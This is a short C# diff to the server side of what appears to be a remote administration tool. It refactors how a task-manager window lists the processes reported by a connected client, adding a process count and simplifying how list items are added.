@@ -76,7 +76,7 @@ namespace xServer.Core.Commands
             if (client.Value == null || client.Value.FrmTm == null)
                 return;
 
-            client.Value.FrmTm.ClearListview();
+            client.Value.FrmTm.ClearListviewItems();
 
             // None of the arrays containing the process' information can be null.
             // The must also be the exact same length because each entry in the three
@@ -87,19 +87,15 @@ namespace xServer.Core.Commands
 
             new Thread(() =>
             {
+                if (client.Value != null && client.Value.FrmTm != null)
+                    client.Value.FrmTm.SetProcessesCount(packet.Processes.Length);
+
                 for (int i = 0; i < packet.Processes.Length; i++)
                 {
-                    if (packet.IDs[i] != 0 && packet.Processes[i] != "System.exe")
-                    {
-                        if (client.Value == null || client.Value.FrmTm == null)
-                            break;
-
-                        ListViewItem lvi =
-                            new ListViewItem(new string[] { packet.Processes[i], packet.IDs[i].ToString(), packet.Titles[i] });
-
-                        if (client.Value != null && client.Value.FrmTm != null)
-                            client.Value.FrmTm.AddProcessToListview(lvi);
-                    }
+                    if (client.Value == null || client.Value.FrmTm == null)
+                        break;
+                    
+                    client.Value.FrmTm.AddProcessToListview(packet.Processes[i], packet.IDs[i], packet.Titles[i]);
                 }
             }).Start();
         }
